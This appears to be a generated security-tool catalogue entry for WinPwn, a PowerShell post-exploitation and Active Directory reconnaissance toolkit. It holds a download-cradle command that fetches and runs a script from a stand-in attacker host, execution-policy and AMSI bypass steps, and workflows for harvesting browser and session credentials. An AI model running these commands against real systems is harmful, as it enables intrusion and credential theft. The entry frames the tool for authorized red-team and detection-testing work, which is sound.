---
name: WinPwn
description: PowerShell-based Windows post-exploitation and Active Directory
  reconnaissance automation toolkit with integrated offensive security modules.
registry: security
tool_id: winpwn
category: post_exploitation
tags:
  - post-exploitation
  - active-directory
  - powershell
  - reconnaissance
  - credential-access
  - lateral-movement
  - automation
mitre_techniques:
  - T1046
  - T1082
  - T1106
  - T1518
  - T1548.002
  - T1552.001
  - T1555
  - T1555.003
summary: "WinPwn is a PowerShell automation framework for Windows
  post-exploitation and AD security testing. Invoke via pwsh after loading the
  module. Use -noninteractive and -consoleoutput flags for headless C2
  execution. Primary modules: -Localrecon (local system enumeration),
  -DomainRecon (AD reconnaissance), -PowerSharpPack (execute
  Seatbelt/PowerUp/Watson in memory), -Kittielocal (credential extraction),
  -sessionGopher, -browserpwn, -sensitivefiles. Module combines numerous
  offensive tools (Rubeus, Inveigh, PrivescCheck, Snaffler, mimikatz) into
  single invocation patterns. Designed for mature environments with existing
  defensive controls; generates high-fidelity detections (PowerShell script
  block logging, process creation). Without -consoleoutput, creates loot/report
  folders on disk. Expect verbose output; DomainRecon especially produces
  massive console logs. Best practice: start with targeted modules rather than
  full automation to manage noise. Repository must be staged locally or via
  -repo flag for full functionality. Tool signatures widely known by EDR/SIEM
  (Datadog, Sigma rules). Use only in authorized red team engagements where
  detection testing is an explicit objective."
sources:
  - https://github.com/S3cur3Th1sSh1t/WinPwn
  - https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1
  - https://docs.datadoghq.com/security/default_rules/def-000-vzv/
  - https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_hktl_winpwn/
  - https://github.com/leesh3288/WinPwn/blob/master/README.md
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754340(v=ws.11)
  - https://ss64.com/nt/
  - https://www.bleepingcomputer.com/news/microsoft/microsoft-releases-a-windows-command-reference-for-over-250-console-commands/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
  - https://redcanary.com/threat-detection-report/techniques/windows-command-shell/
  - https://sourceforge.net/projects/winpwn.mirror/
  - https://evalian.co.uk/penetration-testing-vs-red-team-testing/
generated_at: 2026-05-19T11:28:32.312Z
generated_by: anthropic
source_hash: 39c9c821728c293c917e4c5360b1cfe912f4b4974724999e613048276ed735a0
---

# WinPwn

## Overview

WinPwn is a comprehensive PowerShell-based automation framework for Windows internal penetration testing and Active Directory security assessments. It aggregates multiple offensive security tools (Seatbelt, PowerUp, Watson, Rubeus, Inveigh, mimikatz, SessionGopher, Snaffler, PrivescCheck) into standardized execution workflows. The tool is specifically designed for post-exploitation phases after initial access is achieved, automating reconnaissance, credential harvesting, privilege escalation checks, lateral movement preparation, and vulnerability scanning. WinPwn requires PowerShell (pwsh) and is typically deployed via C2 frameworks or direct execution on compromised Windows hosts. It is widely fingerprinted by defensive tools and generates significant telemetry.

## When to use

Use WinPwn when you have established access to a Windows host or domain and need to rapidly enumerate attack surface, credentials, and privilege escalation paths. Appropriate for authorized red team engagements simulating sophisticated adversaries. Deploy when testing detection capabilities of mature security operations centers—the tool's signatures are well-known and should trigger alerts. Use -Localrecon for comprehensive local system enumeration (services, processes, credentials, sensitive files, browser data). Use -DomainRecon for Active Directory mapping (domain trusts, shares, SQL servers, GPOs, RBCD checks, vulnerability scans for MS17-010/Zerologon/PrintNightmare/BlueKeep). Use -PowerSharpPack to execute .NET offensive binaries in memory without disk artifacts. Do NOT use as initial foothold tool or in environments lacking mature logging—better suited for testing detection posture than stealth operations. Requires PowerShell execution policy bypass or prior compromise of PowerShell constraints.

## Authentication & setup

WinPwn runs within PowerShell sessions and inherits the execution context of the compromised account. No separate authentication mechanism exists—the tool leverages existing Windows authentication tokens and Kerberos tickets. Setup: (1) Transfer WinPwn.ps1 to target or load via download cradle (IEX(New-Object Net.WebClient).DownloadString('http://attacker/WinPwn.ps1')). (2) Import module: Import-Module ./WinPwn.ps1 or dot-source it. (3) Alternatively, use -repo flag to pull repository from remote HTTP server. For C2 framework execution, stage the script in C2's script repository and execute via inline PowerShell task. The tool includes Get_WinPwn_Repo.sh helper script for Linux operator boxes to stage files and start HTTP server (python -m http.server 8000). Ensure target has outbound HTTP/HTTPS if using remote repository flag. No credentials stored in tool itself—all authentication is ambient via current user context or explicitly passed credentials for domain enumeration modules.

## Key commands / parameters

Core invocation pattern: WinPwn -<Module> -noninteractive -consoleoutput. Flags: -noninteractive (skip interactive prompts, use defaults—required for automation), -consoleoutput (disable file output, return all data to console for C2 logging), -repo <URL> (load modules from remote repository). Primary modules: -Localrecon (local system enumeration: services, processes, PowerShell logs, browser credentials, .NET binaries, SessionGopher, sensitive files), -DomainRecon (AD reconnaissance: domain info, shares, SQL servers, MS17-010, Zerologon, PrintNightmare, BlueKeep, RBCD checks, GPO enumeration, Snaffler), -PowerSharpPack (execute .NET tools in memory: Seatbelt, PowerUp, Watson), -Kittielocal (local credential extraction including -browsercredentials flag), -sessionGopher (extract saved sessions/credentials), -browserpwn (browser credential harvesting), -sensitivefiles (search for sensitive file patterns), -dotnet or -Dotnetsearch (search Program Files for .NET assemblies). Individual function calls: generalrecon, generaldomaininfo, shareenumeration, powerSQL, printercheck, Snaffler. Standard usage: WinPwn -noninteractive -consoleoutput -DomainRecon (full AD recon suite) or WinPwn -noninteractive -consoleoutput -Localrecon (full local enumeration).

## Example workflows

Workflow 1 - Post-compromise local enumeration: (1) Establish C2 session on compromised host. (2) Load WinPwn.ps1 into memory. (3) Execute: WinPwn -Localrecon -noninteractive -consoleoutput. (4) Parse output for plaintext credentials, sensitive file paths, vulnerable services. Workflow 2 - Domain reconnaissance from domain-joined host: (1) Verify domain context (whoami /all). (2) Import WinPwn module. (3) Execute: WinPwn -DomainRecon -noninteractive -consoleoutput. (4) Review for vulnerable domain controllers (Zerologon, MS17-010), accessible shares, SQL instances, RBCD misconfiguration. (5) Use identified shares/SQL for lateral movement planning. Workflow 3 - Targeted credential harvesting: (1) Execute: Kittielocal -noninteractive -browsercredentials. (2) Parse browser credential output for external VPN/email credentials. Workflow 4 - In-memory .NET tool execution: (1) Execute: WinPwn -PowerSharpPack -consoleoutput -noninteractive. (2) Retrieve Seatbelt/PowerUp/Watson output from console for privilege escalation vectors. Workflow 5 - Detection testing: (1) Pre-coordinate with blue team. (2) Execute WinPwn -DomainRecon -noninteractive -consoleoutput from known compromised account. (3) Validate PowerShell script block logging, EDR alerts, SIEM correlation rules fire correctly.

## Output format

Without -consoleoutput: Creates timestamped loot/ and report/ directories on disk containing module outputs (CSVs, JSON, plaintext logs). High operational risk—leaves forensic artifacts. With -consoleoutput (RECOMMENDED for C2): All output streams to PowerShell console/C2 logs. Format varies by module—mix of plaintext tables, structured data, and raw tool output. DomainRecon generates extremely verbose output (often 10,000+ lines covering all sub-modules). Localrecon produces structured sections per enumeration function. Browser credentials output as plaintext username:password pairs. SessionGopher outputs saved RDP/WinSCP/PuTTY credentials in structured format. PowerSharpPack returns raw .NET tool output (Seatbelt JSON, PowerUp findings, Watson vulnerability assessments). No unified output schema—operators must parse diverse formats. Key indicators in output: [+] success markers, [!] warnings, [*] informational. Credential findings typically flagged with 'Password:', 'Credential:', or tool-specific markers. For automated parsing, redirect specific sub-modules rather than full suite execution.

## Common pitfalls

Pitfall 1 - Excessive noise: Full -DomainRecon or -Localrecon generates massive network traffic, thousands of event logs, and extensive process creation events—guaranteed detection in monitored environments. Mitigate by using targeted modules. Pitfall 2 - Missing -noninteractive flag: Without this, script pauses for user input, causing C2 session to hang indefinitely. Always include for remote execution. Pitfall 3 - Disk artifacts without -consoleoutput: Default behavior writes loot folders to current directory—obvious forensic artifact. Always use -consoleoutput for operational security. Pitfall 4 - PowerShell execution policy blocks: If Get-ExecutionPolicy is Restricted, you must bypass (powershell.exe -ExecutionPolicy Bypass -File WinPwn.ps1 or Set-ExecutionPolicy Bypass -Scope Process). Pitfall 5 - AMSI/Defender interference: WinPwn and embedded tools trigger AMSI. May require AMSI bypass before loading. Pitfall 6 - Credential context: Domain enumeration requires domain user context; local admin needed for many local enumeration functions (credential access, service enumeration). Pitfall 7 - Detection signatures: Widely signatured by EDR (Datadog, Sigma rules detect 'WinPwn', 'Offline_WinPwn' strings in command lines and script blocks). Expect detection. Pitfall 8 - Repository dependency: Some modules require full repository structure; single-file transfer may cause missing dependencies. Use -repo flag or transfer complete repository.

## References

• https://github.com/S3cur3Th1sSh1t/WinPwn
• https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1
• https://docs.datadoghq.com/security/default_rules/def-000-vzv/
• https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_hktl_winpwn/
• https://redcanary.com/threat-detection-report/techniques/windows-command-shell/
